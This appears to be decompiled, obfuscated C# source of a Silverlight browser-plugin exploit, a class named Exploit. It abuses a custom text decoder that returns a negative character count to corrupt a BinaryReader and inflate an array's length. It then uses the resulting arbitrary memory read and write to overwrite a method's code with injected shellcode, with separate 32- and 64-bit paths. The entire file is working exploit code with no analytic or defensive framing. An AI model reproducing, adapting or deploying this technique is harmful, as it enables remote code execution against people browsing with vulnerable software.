using System;
using System.Collections.Generic;
using System.IO;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Browser;
using System.Windows.Controls;
using e6ZQKais6sdWQYZGvG;
namespace binaryreader
{
    // Token: 0x02000004 RID: 4
    public class Exploit
    {
        // Token: 0x06000004 RID: 4 RVA: 0x000020D4 File Offset: 0x000004D4
        [MethodImpl(8)]
        public void run(IDictionary<string, string> initParams)
        {
            while (false)
            {
                object arg_0A_0 = null;
            }
            Exploit.is64 = (IntPtr.get_Size() == 8);
            if (!this.make_big_array())
            {
                return;
            }
            if (!this.get_array_address())
            {
                return;
            }
            if (Exploit.is64)
            {
               // Exploit.payload64 = Exploit.hex2bin(initParams.get_Item(exusuKvsSOxhZLQsnV.eeM2xusuK(68)));
                new Exploit.Shell64().execute(Exploit.payload64);
                return;
            }
       //     Exploit.payload32 = Exploit.hex2bin(initParams.get_Item(exusuKvsSOxhZLQsnV.eeM2xusuK(86)));
            new Exploit.Shell32().execute(Exploit.payload32);
        }

        // Token: 0x06000005 RID: 5 RVA: 0x00002174 File Offset: 0x00000574
        [MethodImpl(8)]
        private bool make_big_array()
        {
            while (false)
            {
                object arg_0A_0 = null;
            }
            MemoryStream arg_1B_0 = new MemoryStream(32);
            Exploit.CustomEncoding customEncoding = new Exploit.CustomEncoding();
            BinaryReader binaryReader = new BinaryReader(arg_1B_0, customEncoding);
            Exploit.array = new uint[Exploit.array_original_length];
            char[] array = new char[6];
            Exploit.obj = new object[Exploit.obj_count];
            arg_1B_0.SetLength(32L);
            binaryReader.Read(array, 0, array.Length);
            return Exploit.array.Length >= 1073741824;
        }

        // Token: 0x06000006 RID: 6 RVA: 0x000021F4 File Offset: 0x000005F4
        [MethodImpl(8)]
        private bool get_array_address()
        {
            while (false)
            {
                object arg_0A_0 = null;
            }
            Exploit.obj[0] = Exploit.array;
            for (int i = 5; i < 64; i++)
            {
                if (Exploit.array[i] == Exploit.obj_count)
                {
                    if (Exploit.is64)
                    {
                        int num = i + 4;
                        Exploit.array_address = ((ulong)Exploit.array[num + 1] << 32) + (ulong)Exploit.array[num];
                    }
                    else
                    {
                        int num2 = i + 2;
                        Exploit.array_address = (ulong)Exploit.array[num2];
                    }
                    return true;
                }
            }
            return false;
        }

        // Token: 0x06000007 RID: 7 RVA: 0x00002284 File Offset: 0x00000684
        [MethodImpl(8)]
        public static byte[] hex2bin(string hex)
        {
            while (false)
            {
                object arg_0A_0 = null;
            }
            int length = hex.get_Length();
            byte[] array = new byte[length / 2];
            for (int i = 0; i < length; i += 2)
            {
                array[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            }
            return array;
        }

        // Token: 0x06000008 RID: 8 RVA: 0x000022D8 File Offset: 0x000006D8
        [MethodImpl(8)]
        private static void report(string msg)
        {
            while (false)
            {
                object arg_0A_0 = null;
            }
            try
            {
           //     HtmlPage.get_Window().Eval(exusuKvsSOxhZLQsnV.eeM2xusuK(104) + msg + exusuKvsSOxhZLQsnV.eeM2xusuK(122));
            }
            catch (Exception)
            {
            }
        }

        // Token: 0x06000009 RID: 9 RVA: 0x00002334 File Offset: 0x00000734
        [MethodImpl(8)]
        public Exploit() : base()
        {
            while (false)
            {
                object arg_0A_0 = null;
            }
            e562RNDDL8HsDsTqNZ.nbg7uKGSxgMnE();
            //     base..ctor();
        }

        // Token: 0x0600000A RID: 10 RVA: 0x00002350 File Offset: 0x00000750
        [MethodImpl(8)]
        static Exploit()
        {
            // Note: this type is marked as 'beforefieldinit'.
            while (false)
            {
                object arg_0A_0 = null;
            }
            e562RNDDL8HsDsTqNZ.nbg7uKGSxgMnE();
            Exploit.array_original_length = 5u;
            Exploit.obj_count = 170u;
        }

        // Token: 0x04000002 RID: 2
        public static byte[] payload32;

        // Token: 0x04000003 RID: 3
        public static byte[] payload64;

        // Token: 0x04000004 RID: 4
        public static bool is64;

        // Token: 0x04000005 RID: 5
        public static uint[] array;

        // Token: 0x04000006 RID: 6
        public static ulong array_address;

        // Token: 0x04000007 RID: 7
        public static uint array_original_length;

        // Token: 0x04000008 RID: 8
        public static object[] obj;

        // Token: 0x04000009 RID: 9
        public static uint obj_count;

        // Token: 0x02000005 RID: 5
        private class Shell32 : Random
        {
            // Token: 0x0600000B RID: 11 RVA: 0x00002378 File Offset: 0x00000778
            [MethodImpl(8)]
            private uint read_uint(uint addr)
            {
                while (false)
                {
                    object arg_0A_0 = null;
                }
                if (addr > 65536u)
                {
                    return Exploit.array[(int)(addr - (uint)(Exploit.array_address + 8uL) >> 2)];
                }
                return 0u;
            }

            // Token: 0x0600000C RID: 12 RVA: 0x000023A8 File Offset: 0x000007A8
            [MethodImpl(8)]
            private void write_uint(uint addr, uint val)
            {
                while (false)
                {
                    object arg_0A_0 = null;
                }
                if (addr > 65536u)
                {
                    Exploit.array[(int)(addr - (uint)(Exploit.array_address + 8uL) >> 2)] = val;
                }
            }

            // Token: 0x0600000D RID: 13 RVA: 0x000023D8 File Offset: 0x000007D8
            [MethodImpl(8)]
            private void swap_arrays(uint addr, byte[] arr)
            {
                while (false)
                {
                    object arg_0A_0 = null;
                }
                int num = arr.Length;
                uint num2 = 0u;
                while ((ulong)num2 < (ulong)((long)num))
                {
                    uint num3 = (uint)arr[(int)num2];
                    num3 += (uint)((uint)arr[(int)(num2 + 1u)] << 8);
                    num3 += (uint)((uint)arr[(int)(num2 + 2u)] << 16);
                    num3 += (uint)((uint)arr[(int)(num2 + 3u)] << 24);
                    uint num4 = this.read_uint(addr + num2);
                    this.write_uint(addr + num2, num3);
                    arr[(int)num2] = (byte)(num4 & 255u);
                    arr[(int)(num2 + 1u)] = (byte)(num4 >> 8 & 255u);
                    arr[(int)(num2 + 2u)] = (byte)(num4 >> 16 & 255u);
                    arr[(int)(num2 + 3u)] = (byte)(num4 >> 24 & 255u);
                    num2 += 4u;
                }
            }

            // Token: 0x0600000E RID: 14 RVA: 0x00002484 File Offset: 0x00000884
            [MethodImpl(8)]
            public virtual int dummy_function()
            {
                while (false)
                {
                    object arg_0A_0 = null;
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                if (this == null)
                {
                    this.write_uint(0u, 0u);
                }
                return 0;
            }

            // Token: 0x0600000F RID: 15 RVA: 0x00002B08 File Offset: 0x00000F08
            [MethodImpl(8)]
            public virtual void execute(byte[] payload)
            {
                while (false)
                {
                    object arg_0A_0 = null;
                }
                try
                {
                    this.dummy_function();
                    Exploit.obj[0] = Exploit.array;
                    Exploit.obj[1] = this;
                    uint num = 0u;
                    for (int i = 2; i < 64; i++)
                    {
                        if (Exploit.array[i] == (uint)Exploit.array_address)
                        {
                            num = Exploit.array[i + 1];
                            break;
                        }
                    }
                    if (num == 0u)
                    {
                        throw new Exception();
                    }
                    uint num2 = this.read_uint(this.read_uint(this.read_uint(num) + 44u) + 8u);
                    if (num2 == 0u)
                    {
                        throw new Exception();
                    }
                    num2 -= num2 % 4u;
                    this.swap_arrays(num2, payload);
                    this.dummy_function();
                    this.swap_arrays(num2, payload);
                }
                catch (Exception)
                {
                }
                Exploit.array[1073741823] = Exploit.array_original_length;
            }

            // Token: 0x06000010 RID: 16 RVA: 0x00002BF0 File Offset: 0x00000FF0
            [MethodImpl(8)]
            public Shell32() : base()
            {
                while (false)
                {
                    object arg_0A_0 = null;
                }
                e562RNDDL8HsDsTqNZ.nbg7uKGSxgMnE();
                //  base..ctor();
            }
        }

        // Token: 0x02000006 RID: 6
        private class Shell64 : Exploit.Shell32
        {
            // Token: 0x06000011 RID: 17 RVA: 0x00002C0C File Offset: 0x0000100C
            [MethodImpl(8)]
            private ulong read_ulong32(ulong addr)
            {
                while (false)
                {
                    object arg_0A_0 = null;
                }
                if (addr < 65536uL)
                {
                    return 0uL;
                }
                addr = addr - Exploit.array_address - 8uL >> 2;
                return ((ulong)Exploit.array[(int)(checked((IntPtr)(unchecked(addr + 1uL))))] << 32) + (ulong)Exploit.array[(int)(checked((IntPtr)addr))];
            }

            // Token: 0x06000012 RID: 18 RVA: 0x00002C60 File Offset: 0x00001060
            [MethodImpl(8)]
            private void write_ulong32(ulong addr, ulong val)
            {
                while (false)
                {
                    object arg_0A_0 = null;
                }
                if (addr < 65536uL)
                {
                    return;
                }
                addr = addr - Exploit.array_address - 8uL >> 2;
                Exploit.array[(int)(checked((IntPtr)addr))] = (uint)val;
                Exploit.array[(int)(checked((IntPtr)(unchecked(addr + 1uL))))] = (uint)(val >> 32);
            }

            // Token: 0x06000013 RID: 19 RVA: 0x00002CB0 File Offset: 0x000010B0
            [MethodImpl(8)]
            private ulong read_ulong64(ulong addr)
            {
                while (false)
                {
                    object arg_0A_0 = null;
                }
                if (addr < 65536uL)
                {
                    return 0uL;
                }
                this.write_ulong32(this.ums_addr + 8uL, addr);
                this.ums.set_Position(0L);
                this.ums.Read(this.ums_buffer, 0, 8);
                return this.read_address(this.ums_buffer, 0);
            }

            // Token: 0x06000014 RID: 20 RVA: 0x00002D18 File Offset: 0x00001118
            [MethodImpl(8)]
            private void write_ulong64(ulong addr, ulong val)
            {
                while (false)
                {
                    object arg_0A_0 = null;
                }
                if (addr < 65536uL)
                {
                    return;
                }
                this.write_ulong32(this.ums_addr + 8uL, addr);
                this.ums.set_Position(0L);
                this.write_address(this.ums_buffer, 0, val);
                this.ums.Write(this.ums_buffer, 0, 8);
            }

            // Token: 0x06000015 RID: 21 RVA: 0x00002D80 File Offset: 0x00001180
            [MethodImpl(8)]
            private void swap_arrays(ulong addr, byte[] arr)
            {
                while (false)
                {
                    object arg_0A_0 = null;
                }
                int num = arr.Length;
                byte[] array = (byte[])arr.Clone();
                this.write_ulong32(this.ums_addr + 8uL, addr);
                this.ums.set_Position(0L);
                this.ums.Read(arr, 0, num);
                this.ums.set_Position(0L);
                this.ums.Write(array, 0, num);
            }

            // Token: 0x06000016 RID: 22 RVA: 0x00002DF4 File Offset: 0x000011F4
            [MethodImpl(8)]
            public override void execute(byte[] payload)
            {
                while (false)
                {
                    object arg_0A_0 = null;
                }
                try
                {
                    this.dummy_function();
                    ResourceManager resourceManager = new ResourceManager(exusuKvsSOxhZLQsnV.eeM2xusuK(132), typeof(Control).get_Assembly());
                    this.ums = resourceManager.GetStream(exusuKvsSOxhZLQsnV.eeM2xusuK(168));
                    if (this.ums == null)
                    {
                        throw new Exception();
                    }
                    Exploit.obj[0] = Exploit.array;
                    Exploit.obj[1] = this;
                    Exploit.obj[2] = this.ums;
                    ulong num = 0uL;
                    for (int i = 3; i < 64; i++)
                    {
                        if (Exploit.array[i] == (uint)Exploit.array_address)
                        {
                            num = ((ulong)Exploit.array[i + 3] << 32) + (ulong)Exploit.array[i + 2];
                            this.ums_addr = ((ulong)Exploit.array[i + 5] << 32) + (ulong)Exploit.array[i + 4];
                            for (int j = 0; j < 100; j++)
                            {
                                if (Exploit.array_address <= this.ums_addr)
                                {
                                    break;
                                }
                                this.ums = resourceManager.GetStream(exusuKvsSOxhZLQsnV.eeM2xusuK(168));
                                Exploit.obj[2] = this.ums;
                                this.ums_addr = ((ulong)Exploit.array[i + 5] << 32) + (ulong)Exploit.array[i + 4];
                            }
                            break;
                        }
                    }
                    if (num == 0uL)
                    {
                        throw new Exception();
                    }
                    if (Exploit.array_address > this.ums_addr)
                    {
                        throw new Exception();
                    }
                    this.write_ulong32(this.ums_addr + 48uL, 12884901891uL);
                    if (!this.ums.get_CanRead() || !this.ums.get_CanWrite())
                    {
                        throw new Exception();
                    }
                    ulong num2 = this.read_ulong64(this.read_ulong64(this.read_ulong64(num) + 72uL) + 16uL);
                    if (num2 == 0uL)
                    {
                        throw new Exception();
                    }
                    this.swap_arrays(num2, payload);
                    this.dummy_function();
                    this.swap_arrays(num2, payload);
                }
                catch (Exception)
                {
                }
                this.write_ulong64(Exploit.array_address + 8uL, (ulong)Exploit.array_original_length);
            }

            // Token: 0x06000017 RID: 23 RVA: 0x00003024 File Offset: 0x00001424
            [MethodImpl(8)]
            private ulong read_address(byte[] b, int offs)
            {
                while (false)
                {
                    object arg_0A_0 = null;
                }
                ulong num = 0uL;
                int i = offs;
                int num2 = 0;
                while (i < offs + (Exploit.is64 ? 8 : 4))
                {
                    num += (ulong)b[i] << num2;
                    i++;
                    num2 += 8;
                }
                return num;
            }

            // Token: 0x06000018 RID: 24 RVA: 0x0000307C File Offset: 0x0000147C
            [MethodImpl(8)]
            private void write_address(byte[] b, int offs, ulong u)
            {
                while (false)
                {
                    object arg_0A_0 = null;
                }
                int i = offs;
                while (i < offs + (Exploit.is64 ? 8 : 4))
                {
                    b[i] = (byte)(u & 255uL);
                    i++;
                    u >>= 8;
                }
            }

            // Token: 0x06000019 RID: 25 RVA: 0x000030CC File Offset: 0x000014CC
            [MethodImpl(8)]
            public Shell64() : base()
            {
                while (false)
                {
                    object arg_0A_0 = null;
                }
                e562RNDDL8HsDsTqNZ.nbg7uKGSxgMnE();
                this.ums_buffer = new byte[8];
                //    base..ctor();
            }

            // Token: 0x0400000A RID: 10
            private UnmanagedMemoryStream ums;

            // Token: 0x0400000B RID: 11
            private ulong ums_addr;

            // Token: 0x0400000C RID: 12
            private byte[] ums_buffer;
        }

        // Token: 0x02000007 RID: 7
        private class CustomEncoding : UTF8Encoding
        {
            // Token: 0x0600001A RID: 26 RVA: 0x000030F4 File Offset: 0x000014F4
            [MethodImpl(8)]
            public override Decoder GetDecoder()
            {
                while (false)
                {
                    object arg_0A_0 = null;
                }
                return new Exploit.CustomDecoder();
            }

            // Token: 0x0600001B RID: 27 RVA: 0x0000310C File Offset: 0x0000150C
            [MethodImpl(8)]
            public CustomEncoding() : base()
            {
                while (false)
                {
                    object arg_0A_0 = null;
                }
                e562RNDDL8HsDsTqNZ.nbg7uKGSxgMnE();
                // base..ctor();
            }
        }

        // Token: 0x02000008 RID: 8
        private class CustomDecoder : Decoder
        {
            // Token: 0x0600001C RID: 28 RVA: 0x00003128 File Offset: 0x00001528
            [MethodImpl(8)]
            public override int GetChars(byte[] bytes, int byteIndex, int byteCount, char[] chars, int charIndex)
            {
                while (false)
                {
                    object arg_0A_0 = null;
                }
                int num = this.count;
                this.count = num + 1;
                int result;
                if (num != 0)
                {
                    if (num != 1)
                    {
                        result = byteCount;
                    }
                    else
                    {
                        chars[0] = '\0';
                        chars[1] = '䀀';
                        result = 2;
                    }
                }
                else
                {
                    result = (Exploit.is64 ? -28 : -18);
                }
                return result;
            }

            // Token: 0x0600001D RID: 29 RVA: 0x00003198 File Offset: 0x00001598
            [MethodImpl(8)]
            public override int GetCharCount(byte[] bytes, int index, int count)
            {
                while (false)
                {
                    object arg_0A_0 = null;
                }
                return count;
            }

            // Token: 0x0600001E RID: 30 RVA: 0x000031AC File Offset: 0x000015AC
            [MethodImpl(8)]
            public CustomDecoder() : base()
            {
                while (false)
                {
                    object arg_0A_0 = null;
                }
                e562RNDDL8HsDsTqNZ.nbg7uKGSxgMnE();
                //   base..ctor();
            }

            // Token: 0x0400000D RID: 13
            private int count;
        }
    }
}

